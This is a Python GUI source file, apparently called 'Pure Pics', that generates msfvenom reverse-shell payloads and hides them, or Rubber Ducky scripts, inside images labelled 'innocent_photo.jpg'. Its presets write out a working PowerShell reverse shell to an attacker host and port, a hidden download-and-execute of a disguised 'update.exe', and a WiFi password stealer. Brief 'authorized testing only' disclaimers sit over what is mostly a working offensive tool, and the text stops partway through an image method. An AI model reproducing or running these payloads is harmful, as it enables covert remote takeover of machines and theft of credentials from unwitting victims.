#!/usr/bin/env python3
"""
Pure Pics - Advanced Steganographic Payload & Ducky Script Embedding GUI
========================================================================
A professional Python GUI application for embedding payloads and Rubber Ducky
scripts into images using steganographic techniques.

Application: Pure Pics v1.0 - CPR Edition
Author: Security Research Team
Date: 2025-10-04
Purpose: Educational and authorized penetration testing only

WARNING: Use only in controlled environments with explicit permission!
"""

import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext, simpledialog
import subprocess
import threading
import os
import json
import base64
import qrcode
from datetime import datetime
import socket
import tempfile
import shutil
from PIL import Image, ImageTk
import io

class PurePicsGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("🖼️ Pure Pics - CPR Edition | Steganographic Payload & Ducky Embedding")
        self.root.geometry("1100x800")
        self.root.configure(bg='#0a0a0a')  # Deep black CPR background
        
        # Style configuration
        self.setup_styles()
        
        # Variables
        self.output_dir = tk.StringVar(value=os.path.expanduser("~/Desktop/pure_pics_output"))
        self.cover_image_path = tk.StringVar()
        self.payload_type = tk.StringVar(value="msfvenom")
        self.ducky_script_content = tk.StringVar()
        self.embedding_method = tk.StringVar(value="steghide")
        self.operation_history = []
        
        # Create main interface
        self.create_widgets()
        
        # Ensure output directory exists
        os.makedirs(self.output_dir.get(), exist_ok=True)
    
    def setup_styles(self):
        """Configure the GUI styles - Black and Red CPR Theme"""
        style = ttk.Style()
        style.theme_use('clam')
        
        # CPR Black and Red Theme Colors
        bg_black = '#0a0a0a'         # Deep black background
        bg_dark = '#1a1a1a'          # Dark gray for panels
        bg_medium = '#2a2a2a'        # Medium gray for inputs
        red_primary = '#dc2626'      # CPR Red primary
        red_secondary = '#991b1b'    # CPR Red secondary
        red_accent = '#ef4444'       # CPR Red accent
        text_white = '#ffffff'       # Pure white text
        text_gray = '#d1d5db'        # Light gray text
        
        # Configure notebook (tabs)
        style.configure('TNotebook', background=bg_black, borderwidth=0)
        style.configure('TNotebook.Tab', 
                       background=bg_dark, 
                       foreground=text_gray,
                       padding=[12, 8],
                       borderwidth=1)
        style.map('TNotebook.Tab', 
                 background=[('selected', red_primary), ('active', red_secondary)],
                 foreground=[('selected', text_white), ('active', text_white)])
        
        # Configure frames
        style.configure('TFrame', background=bg_black)
        style.configure('TLabelFrame', 
                       background=bg_black,
                       foreground=red_accent,
                       borderwidth=2,
                       relief='solid')
        style.configure('TLabelFrame.Label', 
                       background=bg_black,
                       foreground=red_accent,
                       font=('Arial', 10, 'bold'))
        
        # Configure labels
        style.configure('TLabel', 
                       background=bg_black, 
                       foreground=text_white,
                       font=('Arial', 9))
        
        # Configure buttons - CPR Red theme
        style.configure('TButton', 
                       background=red_primary,
                       foreground=text_white,
                       borderwidth=1,
                       focuscolor='none',
                       font=('Arial', 9, 'bold'))
        style.map('TButton', 
                 background=[('active', red_secondary), ('pressed', red_accent)],
                 foreground=[('active', text_white), ('pressed', text_white)])
        
        # Configure entries and text widgets
        style.configure('TEntry',
                       fieldbackground=bg_medium,
                       background=bg_medium,
                       foreground=text_white,
                       borderwidth=1,
                       insertcolor=text_white)
        style.map('TEntry',
                 focuscolor=[('!focus', red_primary)],
                 bordercolor=[('focus', red_primary)])
        
        # Configure comboboxes
        style.configure('TCombobox',
                       fieldbackground=bg_medium,
                       background=bg_medium,
                       foreground=text_white,
                       arrowcolor=red_accent,
                       borderwidth=1)
        
        # Configure radiobuttons
        style.configure('TRadiobutton',
                       background=bg_black,
                       foreground=text_white,
                       focuscolor='none')
        style.map('TRadiobutton',
                 background=[('active', bg_dark)],
                 indicatorcolor=[('selected', red_primary), ('!selected', bg_medium)])
        
        # Special accent button style
        style.configure('Accent.TButton',
                       background=red_accent,
                       foreground=text_white,
                       borderwidth=2,
                       font=('Arial', 11, 'bold'))
        style.map('Accent.TButton',
                 background=[('active', red_primary), ('pressed', red_secondary)])
        
        # CPR Preset button style
        style.configure('CPR.TButton',
                       background=red_secondary,
                       foreground=text_white,
                       borderwidth=1,
                       font=('Arial', 9, 'bold'))
        style.map('CPR.TButton',
                 background=[('active', red_accent), ('pressed', red_primary)])
    
    def create_widgets(self):
        """Create the main GUI widgets"""
        # Print banner to console
        self.print_banner()
        
        # Main notebook for tabs
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Create tabs
        self.create_payload_tab()
        self.create_ducky_tab()
        self.create_image_tab()
        self.create_embedding_tab()
        self.create_extraction_tab()
        self.create_history_tab()
    
    def print_banner(self):
        """Print Pure Pics CPR-themed banner to console"""
        # ANSI color codes for red styling
        RED = '\033[91m'
        BRIGHT_RED = '\033[31;1m'
        WHITE = '\033[97m'
        GRAY = '\033[90m'
        RESET = '\033[0m'
        BOLD = '\033[1m'
        
        banner = f"""
{BRIGHT_RED}    ██████╗ ██╗   ██╗██████╗ ███████╗    ██████╗ ██╗ ██████╗███████╗{RESET}
{BRIGHT_RED}    ██╔══██╗██║   ██║██╔══██╗██╔════╝    ██╔══██╗██║██╔════╝██╔════╝{RESET}
{BRIGHT_RED}    ██████╔╝██║   ██║██████╔╝█████╗      ██████╔╝██║██║     ███████╗{RESET}
{BRIGHT_RED}    ██╔═══╝ ██║   ██║██╔══██╗██╔══╝      ██╔═══╝ ██║██║     ╚════██║{RESET}
{BRIGHT_RED}    ██║     ╚██████╔╝██║  ██║███████╗    ██║     ██║╚██████╗███████║{RESET}
{GRAY}    ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═╝     ╚═╝ ╚═════╝╚══════╝{RESET}

{BOLD}{WHITE}    🖼️ {BRIGHT_RED}PURE PICS{WHITE} - CPR Edition{RESET}
{WHITE}    🎯 Advanced Steganographic Payload & Ducky Script Embedding{RESET}
{RED}    ⚠️  Educational and Authorized Penetration Testing Only{RESET}
{WHITE}    🛡️  Built for Cybersecurity Professionals{RESET}
{GRAY}    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
        """
        print(banner)
    
    def create_payload_tab(self):
        """Create the MSFVenom payload generation tab"""
        payload_frame = ttk.Frame(self.notebook)
        self.notebook.add(payload_frame, text="🚀 MSFVenom Payload")
        
        # Main container
        main_container = ttk.Frame(payload_frame)
        main_container.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Payload configuration
        config_frame = ttk.LabelFrame(main_container, text="MSFVenom Payload Configuration")
        config_frame.pack(fill='x', pady=(0, 10))
        
        # Payload selection
        ttk.Label(config_frame, text="Payload Type:").grid(row=0, column=0, sticky='w', padx=5, pady=5)
        self.msfvenom_payload = tk.StringVar(value="windows/meterpreter/reverse_tcp")
        payload_combo = ttk.Combobox(config_frame, textvariable=self.msfvenom_payload, width=40)
        payload_combo['values'] = [
            "windows/meterpreter/reverse_tcp",
            "windows/x64/meterpreter/reverse_tcp",
            "windows/shell/reverse_tcp",
            "windows/x64/shell/reverse_tcp",
            "linux/x86/meterpreter/reverse_tcp",
            "linux/x64/meterpreter/reverse_tcp",
            "linux/x86/shell/reverse_tcp",
            "linux/x64/shell/reverse_tcp"
        ]
        payload_combo.grid(row=0, column=1, columnspan=2, sticky='ew', padx=5, pady=5)
        
        # Connection settings
        ttk.Label(config_frame, text="LHOST:").grid(row=1, column=0, sticky='w', padx=5, pady=5)
        self.lhost_var = tk.StringVar(value=self.get_local_ip())
        ttk.Entry(config_frame, textvariable=self.lhost_var, width=20).grid(row=1, column=1, sticky='w', padx=5, pady=5)
        
        ttk.Label(config_frame, text="LPORT:").grid(row=1, column=2, sticky='w', padx=5, pady=5)
        self.lport_var = tk.StringVar(value="4444")
        ttk.Entry(config_frame, textvariable=self.lport_var, width=10).grid(row=1, column=3, sticky='w', padx=5, pady=5)
        
        # Encoding options
        encoding_frame = ttk.LabelFrame(config_frame, text="Encoding Options")
        encoding_frame.grid(row=2, column=0, columnspan=4, sticky='ew', padx=5, pady=10)
        
        self.enable_encoding = tk.BooleanVar(value=True)
        ttk.Radiobutton(encoding_frame, text="🔥 Enable Advanced Encoding", 
                       variable=self.enable_encoding, value=True).pack(anchor='w', padx=5, pady=2)
        ttk.Radiobutton(encoding_frame, text="⚡ Raw Payload (No Encoding)", 
                       variable=self.enable_encoding, value=False).pack(anchor='w', padx=5, pady=2)
        
        # Encoder selection
        encoder_frame = ttk.Frame(encoding_frame)
        encoder_frame.pack(fill='x', padx=5, pady=5)
        ttk.Label(encoder_frame, text="Encoder:").pack(side='left')
        self.encoder_var = tk.StringVar(value="x86/shikata_ga_nai")
        encoder_combo = ttk.Combobox(encoder_frame, textvariable=self.encoder_var, width=25)
        encoder_combo['values'] = ["x86/shikata_ga_nai", "x64/xor_dynamic", "x86/countdown"]
        encoder_combo.pack(side='left', padx=5)
        
        ttk.Label(encoder_frame, text="Iterations:").pack(side='left', padx=(20,0))
        self.iterations_var = tk.StringVar(value="15")
        ttk.Spinbox(encoder_frame, from_=1, to=30, textvariable=self.iterations_var, width=5).pack(side='left', padx=5)
        
        # Generate button
        ttk.Button(config_frame, text="🚀 Generate MSFVenom Payload", 
                  command=self.generate_msfvenom_payload, style='Accent.TButton').grid(row=3, column=0, columnspan=4, pady=15)
        
        config_frame.columnconfigure(1, weight=1)
        config_frame.columnconfigure(3, weight=1)
    
    def create_ducky_tab(self):
        """Create the Rubber Ducky script tab"""
        ducky_frame = ttk.Frame(self.notebook)
        self.notebook.add(ducky_frame, text="🦆 Ducky Script")
        
        # Main container
        main_container = ttk.Frame(ducky_frame)
        main_container.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Script creation section
        script_frame = ttk.LabelFrame(main_container, text="Rubber Ducky Script Creator")
        script_frame.pack(fill='both', expand=True, pady=(0, 10))
        
        # Preset buttons
        preset_frame = ttk.Frame(script_frame)
        preset_frame.pack(fill='x', padx=5, pady=5)
        
        preset_buttons = [
            ("🔥 PowerShell Reverse Shell", self.ducky_powershell_reverse),
            ("🎯 Download & Execute", self.ducky_download_execute),
            ("⚡ WiFi Password Stealer", self.ducky_wifi_stealer),
            ("🔴 System Info Gather", self.ducky_system_info)
        ]
        
        for i, (text, command) in enumerate(preset_buttons):
            ttk.Button(preset_frame, text=text, command=command, style='CPR.TButton').grid(
                row=i//2, column=i%2, padx=5, pady=2, sticky='ew')
        
        preset_frame.columnconfigure(0, weight=1)
        preset_frame.columnconfigure(1, weight=1)
        
        # Script editor
        ttk.Label(script_frame, text="Ducky Script Content:").pack(anchor='w', padx=5, pady=(10,0))
        
        self.ducky_editor = scrolledtext.ScrolledText(
            script_frame, wrap='word', height=15,
            bg='#0a0a0a', fg='#ffffff',
            insertbackground='#dc2626',
            selectbackground='#dc2626',
            selectforeground='#ffffff',
            font=('Consolas', 10),
            relief='solid',
            borderwidth=2
        )
        self.ducky_editor.pack(fill='both', expand=True, padx=5, pady=5)
        
        # Default script
        default_script = """REM Pure Pics - Ducky Script Template
REM Educational and authorized testing only!

DELAY 1000
GUI r
DELAY 500
STRING powershell.exe -WindowStyle Hidden
ENTER
DELAY 2000
STRING Write-Host "Pure Pics Ducky Script Executed!"
ENTER
"""
        self.ducky_editor.insert('1.0', default_script)
        
        # Control buttons
        button_frame = ttk.Frame(script_frame)
        button_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Button(button_frame, text="💾 Save Script", command=self.save_ducky_script).pack(side='left', padx=5)
        ttk.Button(button_frame, text="📁 Load Script", command=self.load_ducky_script).pack(side='left', padx=5)
        ttk.Button(button_frame, text="🧹 Clear", command=self.clear_ducky_script).pack(side='left', padx=5)
        ttk.Button(button_frame, text="🎯 Prepare for Embedding", 
                  command=self.prepare_ducky_for_embedding, style='Accent.TButton').pack(side='right', padx=5)
    
    def create_image_tab(self):
        """Create the image management tab"""
        image_frame = ttk.Frame(self.notebook)
        self.notebook.add(image_frame, text="🖼️ Cover Image")
        
        # Main container
        main_container = ttk.Frame(image_frame)
        main_container.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Image selection
        selection_frame = ttk.LabelFrame(main_container, text="Cover Image Selection")
        selection_frame.pack(fill='x', pady=(0, 10))
        
        # Image path
        path_frame = ttk.Frame(selection_frame)
        path_frame.pack(fill='x', padx=5, pady=5)
        ttk.Label(path_frame, text="Image File:").pack(side='left')
        ttk.Entry(path_frame, textvariable=self.cover_image_path, width=40).pack(side='left', fill='x', expand=True, padx=5)
        ttk.Button(path_frame, text="Browse", command=self.browse_cover_image).pack(side='right')
        
        # Image generation options
        gen_frame = ttk.Frame(selection_frame)
        gen_frame.pack(fill='x', padx=5, pady=5)
        ttk.Button(gen_frame, text="🎲 Generate Random Image", command=self.generate_random_image, style='CPR.TButton').pack(side='left', padx=5)
        ttk.Button(gen_frame, text="🎨 Create Solid Color", command=self.create_solid_image, style='CPR.TButton').pack(side='left', padx=5)
        ttk.Button(gen_frame, text="📱 Generate QR Code", command=self.create_qr_image, style='CPR.TButton').pack(side='left', padx=5)
        
        # Image preview
        preview_frame = ttk.LabelFrame(main_container, text="Image Preview")
        preview_frame.pack(fill='both', expand=True)
        
        self.image_preview = ttk.Label(preview_frame, text="No image selected", background='#1a1a1a')
        self.image_preview.pack(fill='both', expand=True, padx=5, pady=5)
        
        # Image info
        info_frame = ttk.Frame(main_container)
        info_frame.pack(fill='x', pady=(10, 0))
        
        self.image_info = ttk.Label(info_frame, text="Select an image to view details", foreground='#d1d5db')
        self.image_info.pack(anchor='w', padx=5)
    
    def create_embedding_tab(self):
        """Create the steganographic embedding tab"""
        embed_frame = ttk.Frame(self.notebook)
        self.notebook.add(embed_frame, text="🔒 Embed")
        
        # Main container
        main_container = ttk.Frame(embed_frame)
        main_container.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Left side - Configuration
        config_container = ttk.Frame(main_container)
        config_container.pack(side='left', fill='both', expand=True, padx=(0, 10))
        
        # Payload source selection
        source_frame = ttk.LabelFrame(config_container, text="Payload Source")
        source_frame.pack(fill='x', pady=(0, 10))
        
        ttk.Radiobutton(source_frame, text="🚀 Use Generated MSFVenom Payload", 
                       variable=self.payload_type, value="msfvenom").pack(anchor='w', padx=5, pady=2)
        ttk.Radiobutton(source_frame, text="🦆 Use Ducky Script", 
                       variable=self.payload_type, value="ducky").pack(anchor='w', padx=5, pady=2)
        ttk.Radiobutton(source_frame, text="📁 Use Custom File", 
                       variable=self.payload_type, value="custom").pack(anchor='w', padx=5, pady=2)
        
        # Custom file selection
        custom_frame = ttk.Frame(source_frame)
        custom_frame.pack(fill='x', padx=5, pady=5)
        self.custom_payload_path = tk.StringVar()
        ttk.Entry(custom_frame, textvariable=self.custom_payload_path, width=30).pack(side='left', fill='x', expand=True)
        ttk.Button(custom_frame, text="Browse", command=self.browse_custom_payload).pack(side='right', padx=(5,0))
        
        # Embedding method
        method_frame = ttk.LabelFrame(config_container, text="Embedding Method")
        method_frame.pack(fill='x', pady=(0, 10))
        
        ttk.Radiobutton(method_frame, text="🔐 Steghide (Password Protected)", 
                       variable=self.embedding_method, value="steghide").pack(anchor='w', padx=5, pady=2)
        ttk.Radiobutton(method_frame, text="🖼️ LSB (Least Significant Bit)", 
                       variable=self.embedding_method, value="lsb").pack(anchor='w', padx=5, pady=2)
        ttk.Radiobutton(method_frame, text="📋 Metadata (EXIF)", 
                       variable=self.embedding_method, value="metadata").pack(anchor='w', padx=5, pady=2)
        
        # Password settings
        password_frame = ttk.LabelFrame(config_container, text="Security Settings")
        password_frame.pack(fill='x', pady=(0, 10))
        
        ttk.Label(password_frame, text="Password:").grid(row=0, column=0, sticky='w', padx=5, pady=2)
        self.stego_password = tk.StringVar(value="PurePics2024")
        ttk.Entry(password_frame, textvariable=self.stego_password, show='*', width=20).grid(row=0, column=1, sticky='w', padx=5, pady=2)
        
        self.show_password = tk.BooleanVar()
        ttk.Radiobutton(password_frame, text="Show", variable=self.show_password, value=True, 
                       command=self.toggle_password).grid(row=0, column=2, padx=5, pady=2)
        
        # Output settings
        output_frame = ttk.LabelFrame(config_container, text="Output Settings")
        output_frame.pack(fill='x', pady=(0, 10))
        
        # Output directory
        dir_frame = ttk.Frame(output_frame)
        dir_frame.pack(fill='x', padx=5, pady=2)
        ttk.Label(dir_frame, text="Output Directory:").pack(anchor='w')
        dir_entry_frame = ttk.Frame(dir_frame)
        dir_entry_frame.pack(fill='x', pady=2)
        ttk.Entry(dir_entry_frame, textvariable=self.output_dir, width=30).pack(side='left', fill='x', expand=True)
        ttk.Button(dir_entry_frame, text="Browse", command=self.browse_output_dir).pack(side='right', padx=(5,0))
        
        # Filename
        ttk.Label(output_frame, text="Output Filename:").pack(anchor='w', padx=5)
        self.output_filename = tk.StringVar(value="innocent_photo.jpg")
        ttk.Entry(output_frame, textvariable=self.output_filename, width=30).pack(anchor='w', padx=5, pady=2)
        
        # Embed button
        ttk.Button(config_container, text="🔒 Embed Payload into Image", 
                  command=self.embed_payload, style='Accent.TButton').pack(pady=15)
        
        # Right side - Status and preview
        status_container = ttk.Frame(main_container)
        status_container.pack(side='right', fill='both', expand=True)
        
        # Status display
        status_frame = ttk.LabelFrame(status_container, text="Embedding Status")
        status_frame.pack(fill='both', expand=True)
        
        self.status_text = scrolledtext.ScrolledText(
            status_frame, wrap='word',
            bg='#0a0a0a', fg='#ffffff',
            insertbackground='#dc2626',
            selectbackground='#dc2626',
            selectforeground='#ffffff',
            font=('Consolas', 9),
            relief='solid',
            borderwidth=2
        )
        self.status_text.pack(fill='both', expand=True, padx=5, pady=5)
    
    def create_extraction_tab(self):
        """Create the payload extraction tab"""
        extract_frame = ttk.Frame(self.notebook)
        self.notebook.add(extract_frame, text="🔓 Extract")
        
        # Main container
        main_container = ttk.Frame(extract_frame)
        main_container.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Extraction configuration
        config_frame = ttk.LabelFrame(main_container, text="Payload Extraction")
        config_frame.pack(fill='x', pady=(0, 10))
        
        # Source image
        image_frame = ttk.Frame(config_frame)
        image_frame.pack(fill='x', padx=5, pady=5)
        ttk.Label(image_frame, text="Steganographic Image:").pack(side='left')
        self.extract_image_path = tk.StringVar()
        ttk.Entry(image_frame, textvariable=self.extract_image_path, width=40).pack(side='left', fill='x', expand=True, padx=5)
        ttk.Button(image_frame, text="Browse", command=self.browse_extract_image).pack(side='right')
        
        # Extraction method
        method_frame = ttk.Frame(config_frame)
        method_frame.pack(fill='x', padx=5, pady=5)
        ttk.Label(method_frame, text="Method:").pack(side='left')
        self.extract_method = tk.StringVar(value="steghide")
        method_combo = ttk.Combobox(method_frame, textvariable=self.extract_method, width=20)
        method_combo['values'] = ["steghide", "lsb", "metadata"]
        method_combo.pack(side='left', padx=5)
        
        # Password
        ttk.Label(method_frame, text="Password:").pack(side='left', padx=(20,0))
        self.extract_password = tk.StringVar(value="PurePics2024")
        ttk.Entry(method_frame, textvariable=self.extract_password, show='*', width=15).pack(side='left', padx=5)
        
        # Extract button
        ttk.Button(config_frame, text="🔓 Extract Payload", 
                  command=self.extract_payload, style='Accent.TButton').pack(pady=10)
        
        # Results display
        results_frame = ttk.LabelFrame(main_container, text="Extraction Results")
        results_frame.pack(fill='both', expand=True)
        
        self.extraction_results = scrolledtext.ScrolledText(
            results_frame, wrap='word',
            bg='#0a0a0a', fg='#ffffff',
            insertbackground='#dc2626',
            selectbackground='#dc2626',
            selectforeground='#ffffff',
            font=('Consolas', 9),
            relief='solid',
            borderwidth=2
        )
        self.extraction_results.pack(fill='both', expand=True, padx=5, pady=5)
    
    def create_history_tab(self):
        """Create the operation history tab"""
        history_frame = ttk.Frame(self.notebook)
        self.notebook.add(history_frame, text="📜 History")
        
        # Main container
        main_container = ttk.Frame(history_frame)
        main_container.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Controls
        controls_frame = ttk.Frame(main_container)
        controls_frame.pack(fill='x', pady=(0, 10))
        
        ttk.Button(controls_frame, text="🧹 Clear History", command=self.clear_history).pack(side='left', padx=5)
        ttk.Button(controls_frame, text="💾 Export History", command=self.export_history).pack(side='left', padx=5)
        ttk.Button(controls_frame, text="📊 Generate Report", command=self.generate_report, style='CPR.TButton').pack(side='right', padx=5)
        
        # History display
        history_display_frame = ttk.LabelFrame(main_container, text="Operation History")
        history_display_frame.pack(fill='both', expand=True)
        
        self.history_text = scrolledtext.ScrolledText(
            history_display_frame, wrap='word',
            bg='#0a0a0a', fg='#ffffff',
            insertbackground='#dc2626',
            selectbackground='#dc2626',
            selectforeground='#ffffff',
            font=('Consolas', 9),
            relief='solid',
            borderwidth=2
        )
        self.history_text.pack(fill='both', expand=True, padx=5, pady=5)
    
    # Utility methods
    def get_local_ip(self):
        """Get the local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def log_operation(self, operation_type, details):
        """Log an operation to history"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        entry = f"[{timestamp}] {operation_type}:\n{details}\n{'='*60}\n"
        
        self.operation_history.append(entry)
        self.history_text.insert(tk.END, entry)
        self.history_text.see(tk.END)
    
    def append_status(self, text):
        """Append text to status display"""
        self.status_text.insert(tk.END, text + "\n")
        self.status_text.see(tk.END)
        self.root.update_idletasks()
    
    # MSFVenom methods
    def generate_msfvenom_payload(self):
        """Generate MSFVenom payload"""
        try:
            self.append_status("🔥 [PURE PICS] Starting MSFVenom payload generation...")
            
            # Build command
            cmd_parts = ["msfvenom"]
            cmd_parts.extend(["-p", self.msfvenom_payload.get()])
            cmd_parts.extend([f"LHOST={self.lhost_var.get()}", f"LPORT={self.lport_var.get()}"])
            
            if self.enable_encoding.get():
                cmd_parts.extend(["-e", self.encoder_var.get()])
                cmd_parts.extend(["-i", self.iterations_var.get()])
            
            cmd_parts.extend(["-f", "raw"])
            
            # Output file
            self.current_payload_path = os.path.join(tempfile.gettempdir(), "pure_pics_payload.bin")
            cmd_parts.extend(["-o", self.current_payload_path])
            
            command = " ".join(cmd_parts)
            self.log_operation("MSFVENOM GENERATION", command)
            
            # Execute command
            threading.Thread(target=self.run_msfvenom_command, args=(command,), daemon=True).start()
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to generate payload: {str(e)}")
    
    def run_msfvenom_command(self, command):
        """Run MSFVenom command in separate thread"""
        try:
            process = subprocess.Popen(
                command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                universal_newlines=True, bufsize=1
            )
            
            for line in process.stdout:
                self.root.after(0, self.append_status, line.strip())
            
            process.wait()
            
            if process.returncode == 0:
                size = os.path.getsize(self.current_payload_path)
                self.root.after(0, self.append_status, f"✅ MSFVenom payload generated successfully! ({size} bytes)")
                self.root.after(0, messagebox.showinfo, "🔥 Pure Pics Success", 
                               f"MSFVenom payload generated!\n\n📁 Size: {size} bytes\n🎯 Ready for embedding!")
            else:
                self.root.after(0, self.append_status, f"❌ MSFVenom generation failed!")
                
        except Exception as e:
            self.root.after(0, self.append_status, f"❌ Error: {str(e)}")
    
    # Ducky Script methods
    def ducky_powershell_reverse(self):
        """Generate PowerShell reverse shell ducky script"""
        script = f"""REM Pure Pics - PowerShell Reverse Shell
REM Educational and authorized testing only!

DELAY 1000
GUI r
DELAY 500
STRING powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass
ENTER
DELAY 2000
STRING $client = New-Object System.Net.Sockets.TCPClient('{self.lhost_var.get()}',{self.lport_var.get()});
ENTER
STRING $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};
ENTER
STRING while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;
ENTER
STRING $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
ENTER
STRING $sendback = (iex $data 2>&1 | Out-String );
ENTER
STRING $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
ENTER
STRING $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
ENTER
STRING $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}
ENTER
STRING $client.Close()
ENTER
"""
        self.ducky_editor.delete('1.0', tk.END)
        self.ducky_editor.insert('1.0', script)
        self.append_status("🦆 PowerShell reverse shell script loaded!")
    
    def ducky_download_execute(self):
        """Generate download and execute ducky script"""
        script = """REM Pure Pics - Download & Execute
REM Educational and authorized testing only!

DELAY 1000
GUI r
DELAY 500
STRING powershell.exe -WindowStyle Hidden
ENTER
DELAY 2000
STRING Invoke-WebRequest -Uri "http://CHANGE_THIS_URL/payload.exe" -OutFile "$env:temp\\update.exe"
ENTER
STRING Start-Process "$env:temp\\update.exe"
ENTER
"""
        self.ducky_editor.delete('1.0', tk.END)
        self.ducky_editor.insert('1.0', script)
        self.append_status("🦆 Download & Execute script loaded!")
    
    def ducky_wifi_stealer(self):
        """Generate WiFi password stealer ducky script"""
        script = """REM Pure Pics - WiFi Password Stealer
REM Educational and authorized testing only!

DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING netsh wlan export profile key=clear folder=C:\\temp
ENTER
STRING powershell "Get-ChildItem C:\\temp\\*.xml | ForEach-Object {$xml=[xml](Get-Content $_);Write-Host $xml.WLANProfile.name':'$xml.WLANProfile.MSM.security.sharedKey.keyMaterial}"
ENTER
DELAY 2000
STRING exit
ENTER
"""
        self.ducky_editor.delete('1.0', tk.END)
        self.ducky_editor.insert('1.0', script)
        self.append_status("🦆 WiFi Password Stealer script loaded!")
    
    def ducky_system_info(self):
        """Generate system information gathering ducky script"""
        script = """REM Pure Pics - System Info Gatherer
REM Educational and authorized testing only!

DELAY 1000
GUI r
DELAY 500
STRING powershell.exe -WindowStyle Hidden
ENTER
DELAY 2000
STRING $info = @()
ENTER
STRING $info += "Computer: " + (Get-ComputerInfo).CsName
ENTER
STRING $info += "OS: " + (Get-ComputerInfo).WindowsProductName
ENTER
STRING $info += "User: " + $env:USERNAME
ENTER
STRING $info += "Domain: " + $env:USERDOMAIN
ENTER
STRING $info | Out-File "$env:temp\\sysinfo.txt"
ENTER
STRING Write-Host "System info saved to temp folder"
ENTER
"""
        self.ducky_editor.delete('1.0', tk.END)
        self.ducky_editor.insert('1.0', script)
        self.append_status("🦆 System Info Gatherer script loaded!")
    
    def save_ducky_script(self):
        """Save ducky script to file"""
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("Ducky files", "*.ducky"), ("All files", "*.*")],
            title="Save Ducky Script"
        )
        
        if filename:
            try:
                with open(filename, 'w') as f:
                    f.write(self.ducky_editor.get('1.0', tk.END))
                self.append_status(f"💾 Ducky script saved to: {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save script: {str(e)}")
    
    def load_ducky_script(self):
        """Load ducky script from file"""
        filename = filedialog.askopenfilename(
            filetypes=[("Text files", "*.txt"), ("Ducky files", "*.ducky"), ("All files", "*.*")],
            title="Load Ducky Script"
        )
        
        if filename:
            try:
                with open(filename, 'r') as f:
                    content = f.read()
                self.ducky_editor.delete('1.0', tk.END)
                self.ducky_editor.insert('1.0', content)
                self.append_status(f"📁 Ducky script loaded from: {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to load script: {str(e)}")
    
    def clear_ducky_script(self):
        """Clear ducky script editor"""
        self.ducky_editor.delete('1.0', tk.END)
        self.append_status("🧹 Ducky script editor cleared!")
    
    def prepare_ducky_for_embedding(self):
        """Prepare ducky script for embedding"""
        try:
            script_content = self.ducky_editor.get('1.0', tk.END).strip()
            if not script_content:
                messagebox.showwarning("Warning", "No ducky script content to prepare!")
                return
            
            # Save ducky script to temp file
            self.current_ducky_path = os.path.join(tempfile.gettempdir(), "pure_pics_ducky.txt")
            with open(self.current_ducky_path, 'w') as f:
                f.write(script_content)
            
            size = os.path.getsize(self.current_ducky_path)
            self.append_status(f"🎯 Ducky script prepared for embedding! ({size} bytes)")
            
            # Switch to embedding tab
            self.notebook.select(3)  # Embedding tab
            self.payload_type.set("ducky")
            
            messagebox.showinfo("🦆 Pure Pics", f"Ducky script prepared!\n\n📁 Size: {size} bytes\n🎯 Ready for embedding!")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to prepare ducky script: {str(e)}")
    
    # Image methods
    def browse_cover_image(self):
        """Browse for cover image"""
        filename = filedialog.askopenfilename(
            filetypes=[("Image files", "*.jpg *.jpeg *.png *.bmp *.gif"), ("All files", "*.*")],
            title="Select Cover Image"
        )
        
        if filename:
            self.cover_image_path.set(filename)
            self.update_image_preview(filename)
            self.append_status(f"🖼️ Cover image selected: {os.path.basename(filename)}")
    
    def update_image_preview(self, image_path):
        """Update image preview"""
        try:
            # Load and resize image for preview
            with Image.open(image_path) as img:
                # Get image info
                size_bytes = os.path.getsize(image_path)
                width, height = img.size
                format_type = img.format
                
                self.image_info.config(text=f"📊 {width}x{height} pixels, {format_type}, {size_bytes:,} bytes")
                
                # Create thumbnail
                img.thumbnail((300, 300), Image.Resampling.LANCZOS)
                photo = ImageTk.PhotoImage(img)
                
                # Update preview
                self.image_preview.config(image=photo, text="")
                self.image_preview.image = photo  # Keep a reference
                
        except Exception as e:
            self.image_preview.config(image="", text=f"Error loading image: {str(e)}")
            self.image_info.config(text="❌ Failed to load image")
    
    def generate_random_image(self):
        """Generate a random image"""
        try:
            # Create random image
            width, height = 800, 600
            img = Image.new('RGB', (width, height))
            
            # Fill with random colors (simple pattern)
            pixels = []
            import random
            for y in range(height):
                for x in range(width):
                    r = random.randint(0, 255)
                    g = random.randint(0, 255)
                    b = random.randint(0, 255)
                    pixels.append((r, g, b))
            
            img.putdata(pixels)
            
            # Save image
            output_path = os.path.join(self.output_dir.get(), "random_cover.jpg")
            img.save(output_path, "JPEG", quality=85)
            
            self.cover_image_path.set(output_path)
